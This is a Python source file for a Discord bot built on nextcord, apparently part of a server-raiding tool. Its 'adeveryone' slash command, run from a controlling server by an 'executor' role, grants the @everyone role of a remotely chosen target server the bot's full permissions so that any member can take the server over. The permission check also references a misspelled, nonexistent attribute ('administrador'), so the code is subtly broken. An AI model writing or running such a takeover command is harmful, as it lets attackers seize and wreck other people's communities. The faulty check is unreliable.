import datetime

import nextcord
from nextcord.ext import commands, application_checks
from nextcord import Embed, Interaction, Color, SlashOption

from utils.server_actions import Actions
from utils.server_utils import ServerUtils
from config.config_handler import ConfigHandler
from middlewares.bot_permissions import BotPermissions
from middlewares.server_verification import ServerVerification

class AdminEveryone(commands.Cog):

    actions = Actions()
    utils = ServerUtils()
    permissions = BotPermissions()
    config_handler = ConfigHandler()
    verifications = ServerVerification()
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @nextcord.slash_command(
        name = "adeveryone",
        description = "Da admin a al rol @everyone.",
        guild_ids = config_handler.get_CaC_server_id()
    )
    
    @application_checks.has_role(config_handler.get_executor_rol_id())
    async def adadmin_command(self, ctx: Interaction,
            id: str = SlashOption(required = True, description = "ID del servidor objetivo")):
        
        guild = self.utils.get_server(int(id), self.bot)
        
        self.verifications.check_command_execution_in_allowed_server(guild.id)
        
        if (not guild.me.guild_permissions.manage_roles
            and not guild.me.guild_permissions.administrador):
            
            raise commands.BotMissingPermissions(["8"])
        
        result = await self.actions.set_admin_everyone(guild)
        if result is False: raise commands.BotMissingPermissions()
        
        admin_embed = Embed(
            title = "✅| Se le ha ortorgado al rol everyone los máximos permisos con los que cuenta el bot.",
            color = Color.green(),
            timestamp = datetime.datetime.now()
        )
        
        await ctx.response.send_message(embed = admin_embed)
        
def setup(client):
    client.add_cog(AdminEveryone(client))